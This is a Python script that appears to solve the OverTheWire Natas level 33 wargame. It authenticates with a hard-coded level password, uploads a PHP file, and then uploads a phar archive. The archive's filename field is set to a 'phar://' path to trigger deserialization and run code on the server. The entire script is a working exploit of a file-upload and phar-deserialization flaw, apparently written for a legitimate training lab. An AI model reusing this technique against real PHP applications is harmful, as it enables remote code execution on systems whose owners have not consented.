import requests
from requests.auth import HTTPBasicAuth
url = 'http://natas33.natas.labs.overthewire.org/index.php'
ps33 = '2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ'
user = 'natas33'
basicAuth=HTTPBasicAuth(user,ps33)
files = {'uploadedfile': open('natas33_2.php', 'rb')}
data = {
    'filename': 'natas33_2.php',
    'submit'  : 'Upload File'
    }
session = requests.Session()
r = session.post(url, auth=basicAuth, files=files,data=data)

files = {'uploadedfile': open('natas33.phar', 'rb')}
data = {
    'filename': 'phar://natas33.phar/test.txt',
    'submit'  : 'Upload File'
    }
r = session.post(url, auth=basicAuth,files=files, data=data)
print(r.text)